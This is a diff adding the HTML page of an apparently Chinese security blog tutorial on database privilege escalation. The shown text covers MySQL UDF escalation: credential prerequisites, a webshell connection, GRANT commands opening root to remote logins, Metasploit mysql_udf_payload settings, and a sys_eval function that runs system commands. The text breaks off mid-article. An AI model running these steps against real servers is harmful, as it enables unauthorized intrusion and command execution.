@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="数据库提权思路">
+<title>数据库提权</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="数据库提权">
+<meta property='og:description' content="数据库提权思路">
+<meta property='og:url' content='https://lserein.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-14T19:35:57&#43;08:00'/><meta property='article:modified_time' content='2025-06-15T13:53:32&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo.jpg' />
+<meta name="twitter:title" content="数据库提权">
+<meta name="twitter:description" content="数据库提权思路"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#mysql数据库提权">Mysql数据库提权</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#mysql数据库前提条件">Mysql数据库前提条件</a></li>
+          </ol>
+        </li>
+        <li><a href="#windows下-udf提权">Windows下-UDF提权</a>
+          <ol>
+            <li><a href="#设置数据库root外联">设置数据库Root外联</a></li>
+            <li><a href="#提权">提权</a></li>
+          </ol>
+        </li>
+        <li><a href="#mof提权">MOF提权</a></li>
+        <li><a href="#mysql启动项提权">mysql启动项提权</a></li>
+      </ol>
+    </li>
+    <li><a href="#sqlserver提权">SqlServer提权</a>
+      <ol>
+        <li><a href="#xp_cmdshell提权">XP_cmdshell提权</a></li>
+        <li><a href="#sp_oacreate提权">sp_oacreate提权</a></li>
+        <li><a href="#沙盒提权xp_regwrite">沙盒提权xp_regwrite</a></li>
+      </ol>
+    </li>
+    <li><a href="#oracle数据库提权">Oracle数据库提权</a></li>
+    <li><a href="#postgresql数据库提权">PostgreSQL数据库提权</a>
+      <ol>
+        <li><a href="#cve-2018-1058">CVE-2018-1058</a></li>
+        <li><a href="#cve-2019-9193">CVE-2019-9193</a></li>
+      </ol>
+    </li>
+    <li><a href="#数据库利用工具">数据库利用工具</a>
+      <ol>
+        <li><a href="#mdut">MDUT</a>
+          <ol>
+            <li><a href="#mysql-udf提权">Mysql UDF提权</a></li>
+            <li><a href="#postgresql只支持cve-2019-9193提权">PostgreSQL只支持CVE-2019-9193提权</a></li>
+          </ol>
+        </li>
+        <li><a href="#oracleshelloracle数据库命令执行工具">OracleShell&mdash;Oracle数据库命令执行工具</a></li>
+        <li><a href="#databasetools"><strong>DatabaseTools</strong></a>
+          <ol>
+            <li><a href="#mysql"><strong>Mysql</strong></a></li>
+            <li><a href="#postgresql">PostgreSQL</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">
+                <img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo_hu_745aaf92fd447d43.jpg"
+                        srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo_hu_745aaf92fd447d43.jpg 800w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo_hu_c86f9877e6bec500.jpg 1600w"
+                        width="800" 
+                        height="500" 
+                        loading="lazy"
+                        alt="Featured image of post 数据库提权" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                内网安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">数据库提权</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            数据库提权思路
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 14, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="数据库提权">数据库提权
+</h1><p><a class="link" href="https://mp.weixin.qq.com/s/saTKb2YiAeLEvN94weIKZw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/saTKb2YiAeLEvN94weIKZw</a></p>
+<p><a class="link" href="https://www.freebuf.com/articles/web/264790.html"  target="_blank" rel="noopener"
+    >https://www.freebuf.com/articles/web/264790.html</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/ntyKMxaNZB1kexAwWleh8g"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/ntyKMxaNZB1kexAwWleh8g</a></p>
+<h2 id="mysql数据库提权">Mysql数据库提权
+</h2><p><strong>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，除 Access 数据库外，其他数据库基本都存在数据库提权的可能。当然这里也是主要介绍MySQL数据库的提权</strong></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/1.png"
+	width="1284"
+	height="774"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/1_hu_d4f43ed178902f29.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/1_hu_2b804fc4300e5af.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="398px"
+	
+></p>
+<h4 id="mysql数据库前提条件">Mysql数据库前提条件
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">root权限</span>
+</span></span><span class="line"><span class="cl"><span class="err">secure_file_priv不为Null</span>
+</span></span><span class="line"><span class="cl"><span class="err">网站目录可写</span>
+</span></span><span class="line"><span class="cl"><span class="err">知道网站路径</span>
+</span></span><span class="line"><span class="cl"><span class="err">知道数据库账号密码（SQL注入获取账号密码，网站备份文件或配置文件，爆破）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如在PHPstudy中mysql安装目录下的user.MYD文件下存储着管理员密码</strong></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/2.png"
+	width="1948"
+	height="743"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/2_hu_9df7e42acd2bfda.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/2_hu_aad6a5c66b873614.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="629px"
+	
+></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/3.png"
+	width="1758"
+	height="711"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/3_hu_af7f62efeb66e4a6.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/3_hu_f35172cef9fa7d30.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<h3 id="windows下-udf提权">Windows下-UDF提权
+</h3><p><strong>udf(user-defined-function)是mysql得一个拓展接口，也称为用户自定义函数，用户通过自定义函数来实现在mysql中无法方便实现得功能当攻击者已知root账号和密码，就可以利用root权限，创建带有调用cmd函数的“udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用</strong></p>
+<ol>
+<li><strong>MySQL版本小于5.1的时候，windows2003的udf.dll文件放置在：c:\windows\system32。windows2000的udf.dll文件放置在：c:\winnt\system32。</strong></li>
+<li><strong>MySQL版本大于5.1的时候，udf.dll文件必须放置在MySQL安装目录下的lib\plugin，但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建</strong></li>
+</ol>
+<h4 id="设置数据库root外联">设置数据库Root外联
+</h4><p><strong>Mysql数据库中默认root用户权限都不可以外联，需要在连接上后通过执行命令来添加外部联权限</strong></p>
+<p><strong>这里看一下外连数据库情况，可以看到这里是无法连接的，原因就是root未开启外联</strong></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/4.png"
+	width="806"
+	height="359"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/4_hu_65e80ef240f0887d.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/4_hu_e4125020ca04f510.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="224"
+		data-flex-basis="538px"
+	
+></p>
+<p><strong>通过Webshell外联数据库，这里通过哥斯拉的数据库管理进行外联，也可以使用php大马进行连接</strong></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/5.png"
+	width="1595"
+	height="644"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/5_hu_7103079781371064.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/5_hu_e2a31bce7f2277e5.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="594px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">//开启数据库root外联
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">GRANT</span> <span class="err">ALL</span> <span class="err">PRIVILEGES</span> <span class="err">ON</span> <span class="err">*.*</span> <span class="err">TO</span> <span class="err">&#39;root&#39;@&#39;%&#39;</span> <span class="err">IDENTIFIED</span> <span class="err">BY</span> <span class="err">&#39;root&#39;</span> <span class="err">WITH</span> <span class="err">GRANT</span> <span class="err">OPTION;</span>
+</span></span><span class="line"><span class="cl"><span class="err">GRANT</span> <span class="err">ALL</span> <span class="err">ON</span> <span class="err">*.*</span> <span class="err">TO</span> <span class="err">&#39;root&#39;@&#39;%&#39;</span> <span class="err">IDENTIFIED</span> <span class="err">BY</span> <span class="err">&#39;root&#39;</span> <span class="err">WITH</span> <span class="err">GRANT</span> <span class="err">OPTION;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/6.png"
+	width="2102"
+	height="879"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/6_hu_8070ef8e63cc19f2.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/6_hu_f3684b908945cee6.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="573px"
+	
+></p>
+<h4 id="提权">提权
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">select</span> <span class="err">version();</span>                       <span class="err">#获取数据库版本信息，通过获取数据的版本来确定后面将dll导出的位置</span>
+</span></span><span class="line"><span class="cl"><span class="err">select</span> <span class="err">@@basedir</span>                        <span class="err">##获取数据库安装位置</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/7.png"
+	width="1242"
+	height="555"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/7_hu_c4161161573f0d66.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/7_hu_b6267f6a903e31d1.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="537px"
+	
+></p>
+<p><strong>查看到Mysql安装路径，到路径下查看是否存在plugin文件夹，没有则手动创建一个</strong></p>
+<p><strong>当secure-file-priv为NULL的时候，直接就放弃吧，不要提权了，这里其实是可以提权的，但是最关键的是需要动数据库的配置，以及重启数据库，这个肯定会使得别人数据库产生问题</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">show</span> <span class="err">global</span> <span class="err">variables</span> <span class="err">like</span> <span class="err">&#39;%secure%&#39;;</span>              <span class="err">查看secure_file_priv状态</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用MSF的Mysql UDF提权模块</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">use</span> <span class="err">exploit/multi/mysql/mysql_udf_payload</span>
+</span></span><span class="line"><span class="cl"><span class="err">show</span> <span class="err">options</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">username</span> <span class="err">root</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">rhost</span> <span class="mf">192.168</span><span class="err">.x.x</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">password</span> <span class="err">root</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>这里直接无法攻击成功，由于secure_file_priv为Null</strong></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/a.png"
+	width="2250"
+	height="1200"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/a_hu_6b58e250cd391042.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/a_hu_7f1c623230cf9ad0.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="450px"
+	
+></p>
+<p><strong>修改secure_file_priv的值，必须要重启数据库</strong></p>
+<ol>
+<li><strong>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</strong></li>
+<li><strong>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</strong></li>
+</ol>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/8.png"
+	width="1882"
+	height="631"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/8_hu_e9ccae61bffb93e5.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/8_hu_23f294ce1096d906.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="715px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">此时攻击成功，查询dll文件</span>
+</span></span><span class="line"><span class="cl"><span class="err">select</span> <span class="err">*</span> <span class="err">from</span> <span class="err">mysql.func</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/9.png"
+	width="1500"
+	height="685"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/9_hu_e9a261d1c017d47e.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/9_hu_a4684d50997a07cf.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="525px"
+	
+></p>
+<p><strong>之前提到的，是没有这个函数的，默认的是无回显的，所以可以手动创建一个有回显的函数，这里一定要和你的dll文件名称是一致的，这里我的是CxyZMFgd.dll，不代表你的也是这个，所以命令复制的时候需要修改一下后面的这个dll文件的名称</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">create</span> <span class="err">function</span> <span class="err">sys_eval</span> <span class="err">returns</span> <span class="err">string</span> <span class="err">soname</span> <span class="s2">&#34;uKoEaaGi.dll&#34;</span><span class="err">;</span> <span class="err">##创建函数</span>
+</span></span><span class="line"><span class="cl"><span class="err">drop</span> <span class="err">function</span> <span class="err">sys_eval;</span>  <span class="err">##删除函数，这里是为了执行完后，方便删除记录。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/10.png"
+	width="1085"
+	height="403"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/10_hu_70f73545c60e8de4.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/10_hu_d2e544bca1f15d91.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="269"
+		data-flex-basis="646px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">select</span> <span class="err">sys_eval(&#39;whoami&#39;);</span>
+</span></span></code></pre></td></tr></table>
+</div>
